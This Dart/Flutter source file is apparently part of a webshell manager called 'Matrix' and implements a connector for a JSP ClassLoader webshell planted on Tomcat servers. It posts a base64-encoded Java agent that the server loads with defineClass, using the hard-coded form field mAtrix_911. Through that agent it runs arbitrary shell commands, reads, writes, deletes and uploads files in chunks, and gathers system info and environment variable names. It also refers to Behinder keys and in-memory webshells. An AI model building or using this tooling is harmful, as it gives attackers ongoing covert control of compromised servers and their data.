import 'dart:async';
import 'dart:convert';
import 'dart:io' as io;
import 'dart:math' as math;
import 'dart:typed_data';

import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart' show rootBundle;
import 'package:http/http.dart' as http;

import '../models/file_entry.dart';
import '../utils/encoding_utils.dart';
import 'shell_connector.dart';
import 'shell_exec_connector.dart';

/// ClassLoader 加载 M.class：默认马 `jsp_classloader_b64.jsp`；排错可选用
/// `jsp_classloader_b64_debug.jsp`（明文错误，易暴露，勿当默认上线）。
///
/// 通过上传 Base64 编码的 agent 字节码来实现全功能操作。
/// [Webshell.password] 表示 **表单参数名**（须与 JSP 中 `getParameter` 一致），默认 `mAtrix_911`。
class JspClassloaderConnector extends ShellConnector {
  JspClassloaderConnector(super.webshell);

  late final String _execKey = _randomHex32();
  String? _lastPingDiagnostic;

  /// ClassLoader 单次 POST 体很大 + 服务端 defineClass，首次往往 >15s。
  /// 若 ping 仍用 15s 超时，Dart 会取消 Future → 连接被掐断 →
  /// 「Connection closed while receiving data」（误判成网络问题）。
  static const _kPostTimeout = Duration(seconds: 120);
  static const _kPingTimeout = Duration(seconds: 120);

  Future<http.Response> _postLargeForm(
    Uri uri,
    Map<String, String> headers,
    String body,
  ) async {
    final h = Map<String, String>.from(headers);
    h['Connection'] = 'close';
    h['Accept-Encoding'] = 'identity';
    h['User-Agent'] ??= 'Mozilla/5.0 (compatible; Matrix-JSP-CL/1.0)';
    if (kIsWeb) {
      return http.post(uri, headers: h, body: body).timeout(_kPostTimeout);
    }
    final client = io.HttpClient()
      ..connectionTimeout = const Duration(seconds: 60)
      ..idleTimeout = const Duration(seconds: 120);
    try {
      final req = await client.postUrl(uri);
      h.forEach((name, value) {
        req.headers.set(name, value);
      });
      final bytes = utf8.encode(body);
      req.contentLength = bytes.length;
      req.add(bytes);
      final resp = await req.close().timeout(_kPostTimeout);
      final code = resp.statusCode;
      final rh = <String, String>{};
      resp.headers.forEach((name, values) {
        rh[name] = values.join(',');
      });
      final builder = BytesBuilder(copy: false);
      try {
        await for (final chunk in resp) {
          builder.add(chunk);
        }
      } on io.HttpException catch (e) {
        // Tomcat 在 JSP 异常或连接策略下可能先发 200 再在收完 body 前 RST。
        // 已收到部分 body → 仍当作成功（如 MATRIX_JSP_PING）。
        // exec 类命令（rm、touch 等）成功时常 **零 stdout**，响应体为 0 字节；
        // 部分环境下读流仍会触发 HttpException，不能要求 builder.length > 0。
        if (code == 200) {
          return http.Response.bytes(
            builder.takeBytes(),
            code,
            headers: rh,
          );
        }
        throw http.ClientException(
          '${e.message}（HTTP $code，已收 ${builder.length} 字节）。'
          '请查 Tomcat logs/catalina.out 是否 defineClass/JSP 报错；'
          '并确认 server.xml Connector maxPostSize、maxSwallowSize 足够大。',
          uri,
        );
      } on io.SocketException {
        if (code == 200) {
          return http.Response.bytes(
            builder.takeBytes(),
            code,
            headers: rh,
          );
        }
        rethrow;
      }
      return http.Response.bytes(builder.takeBytes(), code, headers: rh);
    } on io.HttpException catch (e) {
      throw http.ClientException('HttpException: ${e.message}', uri);
    } on io.SocketException catch (e) {
      throw http.ClientException('SocketException: ${e.message}', uri);
    } finally {
      client.close(force: true);
    }
  }

  static String _randomHex32() {
    final rng = math.Random.secure();
    return List.generate(32, (_) => rng.nextInt(16).toRadixString(16)).join();
  }

  @override
  String? get lastPingDiagnostic => _lastPingDiagnostic;

  @override
  Set<ConnectorCapability> get capabilities => const {
    ConnectorCapability.codeExec,
    ConnectorCapability.shellExec,
    ConnectorCapability.fileRead,
    ConnectorCapability.fileWrite,
  };

  /// UTF-8 字节级 percent-encode（与 charset=UTF-8 一致；按 codeUnit 编码会破坏中文）
  /// 冰蝎 16 位 HEX 密钥；误填在「密码」里会导致表单参数名错误（内置 JSP 只认 mAtrix_911）
  static bool _looksLikeBehinderHexKey(String s) {
    final t = s.trim();
    if (t.length != 16 && t.length != 32) return false;
    for (var i = 0; i < t.length; i++) {
      final c = t.codeUnitAt(i);
      if (!((c >= 0x30 && c <= 0x39) ||
          (c >= 0x61 && c <= 0x66) ||
          (c >= 0x41 && c <= 0x46))) {
        return false;
      }
    }
    return true;
  }

  /// 内置 `jsp_classloader_b64.jsp` 写死 `getParameter("mAtrix_911")`，表单字段名必须是它；
  /// [Webshell.password] 表示该字段名；若空或误填 HEX 密钥则回退为 mAtrix_911。
  String _classloaderFormFieldName() {
    final p = webshell.password?.trim() ?? '';
    if (p.isEmpty) return 'mAtrix_911';
    if (_looksLikeBehinderHexKey(p)) return 'mAtrix_911';
    return p;
  }

  static String _formEncode(String s) {
    final buf = StringBuffer();
    for (final b in utf8.encode(s)) {
      if ((b >= 0x41 && b <= 0x5A) ||
          (b >= 0x61 && b <= 0x7A) ||
          (b >= 0x30 && b <= 0x39) ||
          b == 0x2D ||
          b == 0x5F ||
          b == 0x2E ||
          b == 0x7E) {
        buf.writeCharCode(b);
      } else {
        buf.write('%${b.toRadixString(16).padLeft(2, '0').toUpperCase()}');
      }
    }
    return buf.toString();
  }

  Future<String> _sendJsp(
    String action, {
    Map<String, String> extraParams = const {},
  }) async {
    try {
      final uri = Uri.parse(webshell.url);
      String payload;
      try {
        payload = (await rootBundle.loadString('data/jsp_agent_M.b64')).trim();
      } catch (_) {
        try {
          final file = io.File('data/jsp_agent_M.b64');
          payload = await file.exists()
              ? (await file.readAsString()).trim()
              : '';
        } catch (_) {
          payload = '';
        }
      }

      if (payload.isEmpty) {
        return '[Error] jsp_agent_M.b64 为空或未打入应用包。请确认 pubspec.yaml 含 data/jsp_agent_M.b64，'
            '执行 flutter clean 后完整运行（勿仅用热重载）。';
      }

      final paramName = _classloaderFormFieldName();

      final bodyParts = <String>[
        '${_formEncode(paramName)}=${_formEncode(payload)}',
        'a=${_formEncode(action)}',
        ...extraParams.entries.map(
          (e) => '${_formEncode(e.key)}=${_formEncode(e.value)}',
        ),
      ];

      final response = await _postLargeForm(
        uri,
        {
          'Content-Type':
              'application/x-www-form-urlencoded; charset=UTF-8',
        },
        bodyParts.join('&'),
      );

      if (response.statusCode == 200) {
        return decodeWithFallback(response.bodyBytes);
      }
      final body = decodeWithFallback(response.bodyBytes);
      final snippet = body.length > 4096
          ? '${body.substring(0, 4096)}...'
          : body;
      return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
    } on TimeoutException {
      return '[Timeout] 连接超时';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}\n'
          '（ClassLoader 单次 POST 约几十 KB，若反复出现请检查 Tomcat server.xml '
          'Connector maxPostSize、maxSwallowSize，或目标是否在读完请求体前重置连接）';
    } catch (e) {
      return '[Error] $e';
    }
  }

  // ── ShellConnector 实现 ────────────────────────────────────────────────────

  @override
  Future<bool> ping() async {
    try {
      final r = await _sendJsp('ping').timeout(_kPingTimeout);
      if (r.contains('MATRIX_JSP_PING')) {
        _lastPingDiagnostic = null;
        return true;
      }
      if (r.trim().isEmpty) {
        _lastPingDiagnostic =
            'HTTP 200 但响应体为空。常见原因：① 服务端 JSP 参数名不是「${_classloaderFormFieldName()}」'
            '（内置马固定为 mAtrix_911，勿把冰蝎 HEX 密钥填进密码框当参数名）；② 目标未执行内存马或 defineClass 失败。';
      } else {
        _lastPingDiagnostic = r;
      }
      return false;
    } catch (e) {
      _lastPingDiagnostic = e.toString();
      return false;
    }
  }

  static String _sq(String s) => "'${s.replaceAll("'", "'\\''")}'";

  static bool _hasNonAscii(String s) => s.codeUnits.any((c) => c > 127);

  @override
  Future<String> executeCommand(String cmd, {String workingDir = ''}) async {
    final String cd;
    if (workingDir.isNotEmpty && workingDir.startsWith('/')) {
      if (_hasNonAscii(workingDir)) {
        final b64Wd = base64.encode(utf8.encode(workingDir));
        cd = "_wd=\$(echo ${_sq(b64Wd)}|base64 -d) && cd \"\$_wd\" && ";
      } else {
        cd = 'cd ${_sq(workingDir)} && ';
      }
    } else {
      cd = '';
    }
    final r = await _sendJsp(
      'exec',
      extraParams: {
        '_k': _execKey,
        _execKey: '$cd${ShellExecConnector.quoteRmOperandIfNeeded(cmd)}',
      },
    );
    return r.trim();
  }

  /// 与 jsp_behinder 一致：路径 base64 后走 exec，避免表单/Shell 编码损坏中文路径
  String _execLsCmd(String path) {
    final b64Path = base64.encode(utf8.encode(path));
    return "_p=\$(echo ${_sq(b64Path)}|base64 -d);"
        "{ echo '..';ls -a \"\$_p\" 2>/dev/null|grep -vE '^\\.\\.?\$'; }"
        "|while IFS= read -r n;do"
        " f=\"\$_p/\$n\";[ -e \"\$f\" ]||continue;"
        "[ -d \"\$f\" ]&&t=d||t=f;"
        "s=\$(stat -c%s \"\$f\" 2>/dev/null||stat -f%z \"\$f\" 2>/dev/null||echo 0);"
        "p=\$(stat -c%A \"\$f\" 2>/dev/null||stat -f%Sp \"\$f\" 2>/dev/null||echo -);"
        "m=\$(stat -c%y \"\$f\" 2>/dev/null||stat -f%Sm \"\$f\" 2>/dev/null||echo -);"
        "nb=\$(printf '%s' \"\$n\"|base64|tr -d '\\n');"
        "printf '%s|%s|%s|%s|%s\\n' \"\$nb\" \"\$t\" \"\$s\" \"\$p\" \"\$m\";"
        "done";
  }

  List<FileEntry> _parseLsOutput(String result) {
    return result
        .trim()
        .split('\n')
        .where((l) => l.contains('|'))
        .map((line) {
          final parts = line.trim().split('|');
          if (parts.length < 5) return null;
          String name;
          try {
            name = decodeWithFallback(base64.decode(parts[0]));
          } catch (_) {
            name = parts[0];
          }
          return FileEntry(
            name: name,
            isDirectory: parts[1] == 'd',
            size: int.tryParse(parts[2]) ?? 0,
            permissions: parts[3],
            modified: parts[4],
          );
        })
        .whereType<FileEntry>()
        .where((e) => e.name != '.')
        .toList()
      ..sort((a, b) {
        if (a.name == '..') return -1;
        if (b.name == '..') return 1;
        if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
        return a.name.toLowerCase().compareTo(b.name.toLowerCase());
      });
  }

  @override
  Future<String> getCurrentDir() async {
    final r = (await _sendJsp('pwd')).trim();
    if (r.isNotEmpty && !r.startsWith('[')) currentDir = r;
    return currentDir;
  }

  @override
  Future<List<FileEntry>> listDirectory(String path) async {
    final String result;
    if (_hasNonAscii(path)) {
      result = await _sendJsp(
        'exec',
        extraParams: {'_k': _execKey, _execKey: _execLsCmd(path)},
      );
    } else {
      result = await _sendJsp('ls', extraParams: {'path': path});
    }
    if (result.isEmpty ||
        result.startsWith('ERR_OPEN') ||
        result.startsWith('[')) {
      return [];
    }
    return _parseLsOutput(result);
  }

  @override
  Future<String> readFile(String path) async {
    if (_hasNonAscii(path)) {
      try {
        return decodeWithFallback(await readFileBinary(path));
      } catch (_) {
        return '[文件不存在或无权读取]';
      }
    }
    return _sendJsp('cat', extraParams: {'path': path});
  }

  @override
  Future<bool> writeFile(String path, String content) async {
    if (_hasNonAscii(path)) {
      return writeFileBinaryWithProgress(
        path,
        Uint8List.fromList(utf8.encode(content)),
        (_, __) {},
      );
    }
    final r = await _sendJsp(
      'write',
      extraParams: {'path': path, 'data': base64.encode(utf8.encode(content))},
    );
    return r.trim() == '1';
  }

  @override
  Future<bool> deleteFile(String path) async {
    if (_hasNonAscii(path)) {
      final b64Path = base64.encode(utf8.encode(path));
      final cmd =
          "_p=\$(echo ${_sq(b64Path)} | base64 -d) && rm \"\$_p\" && echo 1 || echo 0";
      final r = await _sendJsp(
        'exec',
        extraParams: {'_k': _execKey, _execKey: cmd},
      );
      return r.trim().contains('1');
    }
    final r = await _sendJsp('rm', extraParams: {'path': path});
    return r.trim() == '1';
  }

  @override
  Future<Uint8List> readFileBinary(String path) async {
    final String cmd;
    if (_hasNonAscii(path)) {
      final b64Path = base64.encode(utf8.encode(path));
      cmd =
          "_p=\$(echo ${_sq(b64Path)} | base64 -d)"
          " && cat \"\$_p\" 2>/dev/null | base64 -w0 2>/dev/null"
          " || cat \"\$_p\" 2>/dev/null | base64";
    } else {
      cmd =
          'cat ${_sq(path)} 2>/dev/null | base64 -w0 2>/dev/null'
          " || cat ${_sq(path)} 2>/dev/null | base64";
    }
    final result = await _sendJsp(
      'exec',
      extraParams: {'_k': _execKey, _execKey: cmd},
    );
    final b64 = result.trim().replaceAll(RegExp(r'\s'), '');
    if (b64.isEmpty || b64.startsWith('[')) {
      throw Exception('无法读取文件: $b64');
    }
    return base64.decode(b64);
  }

  /// 上传场景下的实际写入路径：统一直接使用调用方传入的路径（当前浏览目录）。
  static String _uploadPathFor(String path) => path;

  @override
  Future<bool> writeFileBinary(String path, Uint8List bytes) async {
    // 为了避免单次 POST 体超过 Tomcat maxPostSize，这里使用分块协议：
    // 多次 exec 调用，按小块 base64 + shell 重定向写入目标文件。
    return writeFileBinaryWithProgress(path, bytes, (_, __) {});
  }

  // 分块大小：64 KB → base64 约 86 KB
  static const _kChunkSize = 64 * 1024;

  @override
  Future<bool> writeFileBinaryWithProgress(
    String path,
    Uint8List bytes,
    void Function(int sent, int total) onProgress,
  ) async {
    final total = bytes.length;
    final target = _uploadPathFor(path);
    onProgress(0, total);

    // 目标路径 base64 后仅含 ASCII，避免 UTF-8 在表单/Shell 中被错误解码
    final b64Target = base64.encode(utf8.encode(target));

    if (total == 0) {
      final cmd =
          "_p=\$(echo ${_sq(b64Target)} | base64 -d) && : > \"\$_p\" && echo 1 || echo 0";
      final r = await _sendJsp(
        'exec',
        extraParams: {'_k': _execKey, _execKey: cmd},
      );
      return r.trim().endsWith('1');
    }

    int offset = 0;
    bool first = true;
    while (offset < total) {
      final end = (offset + _kChunkSize).clamp(0, total);
      final chunk = bytes.sublist(offset, end);
      final b64 = base64.encode(chunk);
      final redirect = first ? '>' : '>>';
      final cmd =
          "_p=\$(echo ${_sq(b64Target)} | base64 -d) && echo ${_sq(b64)} | base64 -d $redirect \"\$_p\" && echo 1 || echo 0";
      final r = await _sendJsp(
        'exec',
        extraParams: {'_k': _execKey, _execKey: cmd},
      );
      if (!r.trim().endsWith('1')) {
        final snippet = r.length > 500 ? '${r.substring(0, 500)}...' : r;
        debugPrint(
          '[Matrix][jsp_classloader] 上传分块失败 path=$target offset=$offset total=$total '
          'response=${snippet.replaceAll('\n', ' ')}',
        );
        return false;
      }
      offset = end;
      first = false;
      onProgress(offset, total);
    }
    return true;
  }

  @override
  Future<Map<String, String>> getSystemInfo() async {
    final result = await _sendJsp('sysinfo');
    final map = <String, String>{};
    if (result.isEmpty || result.startsWith('[')) return map;
    for (final line in result.trim().split('\n')) {
      final idx = line.indexOf('|');
      if (idx > 0) {
        try {
          final key = decodeWithFallback(
            base64.decode(line.substring(0, idx).trim()),
          );
          final val = decodeWithFallback(
            base64.decode(line.substring(idx + 1).trim()),
          );
          map[key] = val;
        } catch (_) {}
      }
    }
    return map;
  }

  @override
  Future<List<({String name, bool isDir})>> listNamesForCompletion(
    String path,
  ) async {
    final String result;
    if (_hasNonAscii(path)) {
      result = await _sendJsp(
        'exec',
        extraParams: {'_k': _execKey, _execKey: _execLsCmd(path)},
      );
    } else {
      result = await _sendJsp('ls', extraParams: {'path': path});
    }
    if (result.isEmpty || result.startsWith('[')) return [];
    final out = <({String name, bool isDir})>[];
    for (final line in result.trim().split('\n')) {
      final parts = line.trim().split('|');
      if (parts.length < 2) continue;
      try {
        final name = decodeWithFallback(base64.decode(parts[0]));
        out.add((name: name, isDir: parts[1] == 'd'));
      } catch (_) {}
    }
    out.sort((a, b) => a.name.compareTo(b.name));
    return out;
  }

  @override
  Future<String> getHomeDir() async => (await _sendJsp('home')).trim();

  @override
  Future<List<String>> listEnvVarNames() async {
    final result = await _sendJsp('envnames');
    if (result.isEmpty || result.startsWith('[')) return [];
    return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
      ..sort();
  }
}
